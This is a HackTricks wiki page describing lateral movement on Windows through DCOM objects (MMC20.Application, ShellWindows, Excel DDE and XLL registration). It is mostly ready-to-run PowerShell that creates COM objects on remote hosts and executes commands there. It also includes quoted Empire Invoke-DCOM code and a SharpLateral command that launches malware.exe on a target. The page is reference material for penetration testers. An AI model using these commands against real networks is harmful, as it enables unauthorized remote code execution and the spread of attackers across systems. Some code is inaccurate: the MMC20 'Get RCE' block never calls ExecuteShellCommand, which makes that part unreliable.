# DCOM Exec

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## MMC20.Application

**For more info about this technique chech the original post from [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Distributed Component Object Model (DCOM) objects present an interesting capability for network-based interactions with objects. Microsoft provides comprehensive documentation for both DCOM and Component Object Model (COM), accessible [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and [here for COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). A list of DCOM applications can be retrieved using the PowerShell command:

```bash
Get-CimInstance Win32_DCOMApplication
```

The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Check it running:

This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:

```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

This command connects to the DCOM application and returns an instance of the COM object. The ExecuteShellCommand method can then be invoked to execute a process on the remote host. The process involves the following steps:

Check methods:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Get RCE:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```

## ShellWindows & ShellBrowserWindow

**For more info about this technique check the original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

The **MMC20.Application** object was identified to lack explicit "LaunchPermissions," defaulting to permissions that permit Administrators access. For further details, a thread can be explored [here](https://twitter.com/tiraniddo/status/817532039771525120), and the usage of [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET for filtering objects without explicit Launch Permission is recommended.

Two specific objects, `ShellBrowserWindow` and `ShellWindows`, were highlighted due to their lack of explicit Launch Permissions. The absence of a `LaunchPermission` registry entry under `HKCR:\AppID\{guid}` signifies no explicit permissions.

###  ShellWindows
For `ShellWindows`, which lacks a ProgID, the .NET methods `Type.GetTypeFromCLSID` and `Activator.CreateInstance` facilitate object instantiation using its AppID. This process leverages OleView .NET to retrieve the CLSID for `ShellWindows`. Once instantiated, interaction is possible through the `WindowsShell.Item` method, leading to method invocation like `Document.Application.ShellExecute`.

Example PowerShell commands were provided to instantiate the object and execute commands remotely:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### Lateral Movement with Excel DCOM Objects

Lateral movement can be achieved by exploiting DCOM Excel objects. For detailed information, it's advisable to read the discussion on leveraging Excel DDE for lateral movement via DCOM at [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

The Empire project provides a PowerShell script, which demonstrates the utilization of Excel for remote code execution (RCE) by manipulating DCOM objects. Below are snippets from the script available on [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), showcasing different methods to abuse Excel for RCE:

```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

### Automation Tools for Lateral Movement

Two tools are highlighted for automating these techniques:

- **Invoke-DCOM.ps1**: A PowerShell script provided by the Empire project that simplifies the invocation of different methods for executing code on remote machines. This script is accessible at the Empire GitHub repository.

- **SharpLateral**: A tool designed for executing code remotely, which can be used with the command:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```


## Automatic Tools

* The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.
* You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## References

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
